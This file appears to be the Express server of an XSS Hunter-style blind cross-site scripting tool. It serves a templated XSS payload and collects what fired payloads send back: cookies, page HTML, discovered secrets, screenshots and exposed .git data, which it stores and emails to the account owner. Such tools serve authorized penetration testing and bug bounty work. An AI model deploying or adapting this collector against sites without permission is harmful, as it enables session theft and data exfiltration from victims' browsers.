const bodyParser = require('body-parser');
const { Storage } = require('@google-cloud/storage');
const express = require('express');
const fs = require('fs');
const zlib = require('zlib');
const path = require('path');
const asyncfs = require('fs').promises;
const uuid = require('uuid');
const database = require('./database.js');
const PayloadFireResults = database.PayloadFireResults;
const savePayload = database.savePayload;
const Users = database.Users;
const CollectedPages = database.CollectedPages;
const InjectionRequests = database.InjectionRequests;
const sequelize = database.sequelize;
const notification = require('./notification.js');
const api = require('./api.js');
const validate = require('express-jsonschema').validate;
const constants = require('./constants.js');
const Sentry = require('@sentry/node');
const Tracing = require("@sentry/tracing");
const Profiling = require("@sentry/profiling-node");

function set_secure_headers(req, res) {
	res.set("X-XSS-Protection", "mode=block");
	res.set("X-Content-Type-Options", "nosniff");
	res.set("X-Frame-Options", "deny");

	if (req.path.startsWith(constants.API_BASE_PATH)) {
		res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
		res.set("Content-Type", "application/json");
		return
	}
}

async function check_file_exists(file_path) {
	return asyncfs.access(file_path, fs.constants.F_OK).then(() => {
		return true;
	}).catch(() => {
		return false;
	});
}

// Load XSS payload from file into memory
const XSS_PAYLOAD = fs.readFileSync(
	'./probe.js',
	'utf8'
);

var multer = require('multer');
var upload = multer({ dest: '/tmp/' })
const SCREENSHOTS_DIR = path.resolve(process.env.SCREENSHOTS_DIR);
const SCREENSHOT_FILENAME_REGEX = new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}\.png$/i);

async function get_app_server() {
	const app = express();
	
	if (process.env.SENTRY_ENABLED === "true") {
		Sentry.init({
			dsn: process.env.SENTRY_DSN,
			integrations: [
				// enable HTTP calls tracing
				new Sentry.Integrations.Http({ tracing: true }),
				// enable Express.js middleware tracing
				new Tracing.Integrations.Express({ app }),
				// add beta profiling integration
				new Profiling.ProfilingIntegration()
			],
			// 1.0 is 100% capture rate
			profilesSampleRate: 1.0,
			tracesSampleRate: 0.01,
		});

		// RequestHandler creates a separate execution context using domains, so that every
		// transaction/span/breadcrumb is attached to its own Hub instance
		app.use(Sentry.Handlers.requestHandler());
		// TracingHandler creates a trace for every incoming request
		app.use(Sentry.Handlers.tracingHandler());
		app.use(Sentry.Handlers.errorHandler());
	}

	app.set('trust proxy', true);
	app.disable('x-powered-by');

	// I have a question for Express:
	// https://youtu.be/ZtjFsQBuJWw?t=4
	app.set('case sensitive routing', true);
	
	app.use(bodyParser.json());

    // Set security-related headers on requests
    app.use(async function(req, res, next) {
    	set_secure_headers(req, res);
    	next();
    });

    // Handler for HTML pages collected by payloads
    const CollectedPagesCallbackSchema = {
    	"type": "object",
    	"properties": {
    		"uri": {
    			"type": "string",
    			"default": ""
    		},
    		"html": {
    			"type": "string",
    			"default": "" 
    		},
    	}
    };
    app.post('/page_callback', upload.none(), validate({body: CollectedPagesCallbackSchema}), async (req, res) => {
		res.set("Access-Control-Allow-Origin", "*");
		res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
		res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
		res.set("Access-Control-Max-Age", "86400");

		const page_insert_response = await CollectedPages.create({
			id: uuid.v4(),
			uri: req.body.uri,
			html: req.body.html,
		});

		// Send the response immediately, they don't need to wait for us to store everything.
		res.status(200).json({
			"status": "success"
		}).end();
	});

    // Handler for XSS payload data to be received
    const JSCallbackSchema = {
    	"type": "object",
    	"properties": {
    		"uri": {
    			"type": "string",
    			"default": ""
    		},
    		"cookies": {
    			"type": "string",
    			"default": ""
    		},
    		"referrer": {
    			"type": "string",
    			"default": ""
    		},
    		"user-agent": {
    			"type": "string",
    			"default": ""
    		},
    		"browser-time": {
    			"type": "string",
    			"default": "0",
    			"pattern": "^\\d+$"
    		},
    		"probe-uid": {
    			"type": "string",
    			"default": ""
    		},
    		"origin": {
    			"type": "string",
    			"default": ""
    		},
    		"injection_key": {
    			"type": "string",
    			"default": ""
    		},
    		"title": {
    			"type": "string",
    			"default": ""
    		},
    		"was_iframe": {
    			"type": "string",
    			"default": "false",
    			"enum": ["true", "false"]
    		},
    		"secrets": {
    			"type": "string",
    			"default": []
    		},
    		"CORS": {
    			"type": "string",
    			"default": []
    		},
    		"gitExposed": {
    			"type": "string",
    			"default": []
    		},
            "path": {
                "type": "string",
                "default": ""
            }
    	}
    };
    app.post('/js_callback', upload.single('screenshot'), validate({body: JSCallbackSchema}), async (req, res) => {
		res.set("Access-Control-Allow-Origin", "*");
		res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
		res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
		res.set("Access-Control-Max-Age", "86400");

		// Send the response immediately, they don't need to wait for us to store everything.
		res.status(200).json({
			"status": "success"
		}).end();

        if(req.get('host') != process.env.XSS_HOSTNAME) {
            console.debug(`got bad host ${req.get('host')}`);
            return res.redirect("/app/")
        }
        const userPath = req.body.path;
        if (!userPath){
            console.debug("req had no user path ID");
            return
        }

        const user = await Users.findOne({ where: { 'path': userPath } });

        if (user === null){
            console.debug("No user found for path provided");
            return
        }

        console.debug(`Got payload for user id ${user.id}`);
        
        const userID = user.id;
        let encrypted = false;
        if ("encrypted_data" in req.body){
            encrypted = true;
        }

    	// Multer stores the image in the /tmp/ dir. We use this source image
    	// to write a gzipped version in the user-provided dir and then delete
    	// the original uncompressed image.
    	const payload_fire_image_id = uuid.v4();
        let payload_fire_image_filename = "";
        let filename_in_bucket = "";
        if(!encrypted){
    	    payload_fire_image_filename = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.png.gz`;
            filename_in_bucket = `${payload_fire_image_id}.png.gz`;
        }else{
    	    payload_fire_image_filename = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.b64png.enc.gz`;
            filename_in_bucket = `${payload_fire_image_id}.b64png.enc.gz`;
        }
    	const multer_temp_image_path = req.file.path;

    	// We also gzip the image so we don't waste disk space
    	const gzip = zlib.createGzip();
    	const output_gzip_stream = fs.createWriteStream(payload_fire_image_filename);
    	const input_read_stream = fs.createReadStream(multer_temp_image_path);
    	// When the "finish" event is called we delete the original
    	// uncompressed image file left behind by multer.
        if (process.env.USE_CLOUD_STORAGE == "true"){
            const storage = new Storage();
            //creating a bucket instance
            const bucket = storage.bucket(process.env.BUCKET_NAME);
            //compressing the file using gzip
            const gzip = zlib.createGzip();
            const gzipTempFileName = multer_temp_image_path + ".gz";
            const tempFileWriteStream = fs.createWriteStream(gzipTempFileName);
            input_read_stream.pipe(gzip).pipe(tempFileWriteStream);
            // Wait for the file to be finished writing
            await new Promise((resolve, reject) => {
                tempFileWriteStream.on('finish', resolve);
                tempFileWriteStream.on('error', reject);
            });
            //uploading the gzipped file to GCS
            await bucket.upload(gzipTempFileName, {
                gzip: true,
                destination: filename_in_bucket,
                metadata: {
                    cacheControl: 'public, max-age=31536000',
                },
            });
            console.debug(`${payload_fire_image_id}.png.gz has been uploaded to GCS.`);
            await asyncfs.unlink(multer_temp_image_path);
            await asyncfs.unlink(gzipTempFileName);
        }else{
            input_read_stream.pipe(gzip).pipe(output_gzip_stream).on('finish', async (error) => {
                if(error) {
                    console.error(`An error occurred while writing the XSS payload screenshot (gzipped) to disk:`);
                    console.error(error);
                }

                console.debug(`Gzip stream complete, deleting multer temp file: ${multer_temp_image_path}`);

                await asyncfs.unlink(multer_temp_image_path);
            });
        }
    	const payload_fire_id = uuid.v4();
        let payload_fire_data = {}
        if(encrypted){
            payload_fire_data = {
                id: payload_fire_id,
                user_id: userID,
                encrypted: true,
                encrypted_data: req.body.encrypted_data,
                screenshot_id: payload_fire_image_id,
                public_key: req.body.pgp_key
            }
        }else{
            payload_fire_data = {
                id: payload_fire_id,
                user_id: userID,
                url: req.body.uri,
                encrypted: false,
                ip_address: req.ip,
                referer: req.body.referrer,
                user_agent: req.body['user-agent'],
                cookies: req.body.cookies,
                title: req.body.title,
                secrets: JSON.parse(req.body.secrets),
                origin: req.body.origin,
                screenshot_id: payload_fire_image_id,
                was_iframe: (req.body.was_iframe === 'true'),
                browser_timestamp: parseInt(req.body['browser-time']),
                correlated_request: 'No correlated request found for this injection.',
            }
            if (req.body.CORS != "false"){
               payload_fire_data.CORS = req.body.CORS; 
            }
            if (req.body.gitExposed != "false"){
                payload_fire_data.gitExposed = req.body.gitExposed.substring(0,5000);
            }
        }


        // Check for correlated request
        const correlated_request_rec = await InjectionRequests.findOne({
            where: {
                injection_key: req.body.injection_key
            }
        });

        if(correlated_request_rec) {
            payload_fire_data.correlated_request = correlated_request_rec.request;
        }

		// Store payload fire results in the database
		const new_payload_fire_result = await database.savePayload(payload_fire_data);

        console.log(`Saved result for user id ${userID}`);
		// Send out notification via configured notification channel
		if(user.sendEmailAlerts && process.env.EMAIL_NOTIFICATIONS_ENABLED=="true") {
			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
            payload_fire_data.xsshunter_url = `https://${process.env.HOSTNAME}`;
			await notification.send_email_notification(payload_fire_data, user.email);
		}
	});

	
    // Set up /health handler so the user can
    // do uptime checks and appropriate alerting.
    app.get('/health', async (req, res) => {
    	try {
    		await sequelize.authenticate();
    		res.status(200).json({
    			"status": "ok"
    		}).end();
    	} catch (error) {
    		console.error('An error occurred when testing the database connection (/health):', error);
    		res.status(500).json({
    			"status": "error"
    		}).end();
    	}
    });

    const payload_handler = async (req, res) => {
        res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
        res.set("Content-Type", "application/javascript");
        res.set("Access-Control-Allow-Origin", "*");
        res.set("Access-Control-Allow-Methods", "GET, OPTIONS");
        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
        res.set("Access-Control-Max-Age", "86400");

        if(req.get('host') != process.env.XSS_HOSTNAME) {
            console.debug(req.get('host'));
            return res.redirect("/app/");
        }

        const userPath = req.originalUrl.split("/")[1];
        const user = await Users.findOne({ where: { 'path': userPath } });

        if (user === null){
            console.debug(`No user found for path ${userPath}`);
            return res.send("Hey");
        }
        let pgp_key = user.pgp_key;

        if (! pgp_key){
            pgp_key = "";
        }

        console.log(`Got xss fetch for user id ${user.id}`);
        
        let chainload_uri = user.additionalJS;
        if (! chainload_uri){
            chainload_uri = '';
        }
        let xssURI = ""
        if(process.env.NODE_ENV == "development"){
            xssURI = `http://${process.env.XSS_HOSTNAME}`
        }else{

            xssURI = `https://${process.env.XSS_HOSTNAME}`
        }

        res.send(XSS_PAYLOAD.replace(
            /\[HOST_URL\]/g,
            xssURI
        ).replace(
            '[COLLECT_PAGE_LIST_REPLACE_ME]',
            JSON.stringify([])
        ).replace(
            /\[USER_PATH\]/g,
            userPath
        ).replace(
            '[pgp_key]',
            pgp_key
        ).replace(
            '[CHAINLOAD_REPLACE_ME]',
            JSON.stringify(chainload_uri)
        ).replace(
            '[PROBE_ID]',
            JSON.stringify(req.params.probe_id)
        ));
    };

    // Handler that returns the XSS payload at the base path
    app.get('/', payload_handler);

    /*
		Enabling the web control panel is 100% optional. This can be
		enabled with the "CONTROL_PANEL_ENABLED" environment variable.

		However, if the user just wants alerts on payload firing then
		they can disable the web control panel to reduce attack surface.
	*/
	if(process.env.CONTROL_PANEL_ENABLED === 'true') {
        // Enable API and static asset serving.
        await api.set_up_api_server(app);
	} else {
        console.log(`[INFO] Control panel NOT enabled. Not serving API or GUI server, only acting as a notification server...`);
    }

    app.get('/:probe_id', payload_handler);

    return app;
}

module.exports = get_app_server;
